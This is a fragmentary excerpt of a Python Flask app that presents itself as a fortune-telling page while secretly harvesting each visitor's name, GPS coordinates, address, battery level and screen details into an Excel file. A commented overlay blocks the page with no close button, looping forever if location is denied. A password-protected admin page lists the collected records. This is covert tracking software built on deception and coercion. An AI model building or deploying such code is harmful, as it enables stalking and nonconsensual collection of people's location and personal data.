...
def init_excel():
    if not os.path.exists(EXCEL_FILE):
        df = pd.DataFrame(columns=['timestamp','name','latitude','longitude',
...
<!-- LOCATION DENIED OVERLAY — no close, loops forever -->
<div id="overlay">
...
def save_data():
    ...
    try:
        ...
        print(f"✅ {data['name']} | {data['latitude']:.4f},{data['longitude']:.4f}")
        return jsonify({'saved': True, 'fortune': __import__('random').choice(fortunes)})
...
def admin():
    if request.method == 'GET':
        ...
        align-items:center;min-height:100vh;background:#fff0f5;margin:0;">
        <form method="POST" style="background:#fff;padding:40px;border-radius:20px;
        box-shadow:0 10px 30px rgba(0,0,0,0.1);text-align:center;">
            <h2 style="color:#c06c84;">🔒 Admin Login</h2><br>
            <input name="password" type="password" placeholder="Password"
            style="padding:12px 20px;border:2px solid #ffdde1;border-radius:30px;
            font-size:16px;outline:none;margin-bottom:15px;width:100%;text-align:center;">
            <br>
            <button style="background:linear-gradient(135deg,#ff6b6b,#c06c84);
            color:#fff;border:none;padding:12px 35px;border-radius:30px;
            font-size:16px;cursor:pointer;width:100%;">Login</button>
        </form></body></html>
        '''
    ...
    for _, row in df.iterrows():
        ...
        rows += f'''<tr>
            ...
            <td style="max-width:200px;font-size:12px;">{row['address']}</td>
            <td>{row['battery']}</td>
    ...
    <style>
      ...
      th{{background:linear-gradient(135deg,#ff6b6b,#c06c84);color:#fff;
          padding:12px 15px;text-align:left;}}
      td{{padding:10px 15px;border-bottom:1px solid #ffe0e9;font-size:13px;}}
    ...
    <table>
      <tr><th>Time</th><th>Name</th><th>GPS</th>
          <th>Address</th><th>Battery</th><th>Screen</th></tr>
      {rows}
    </table>
    </body></html>'''
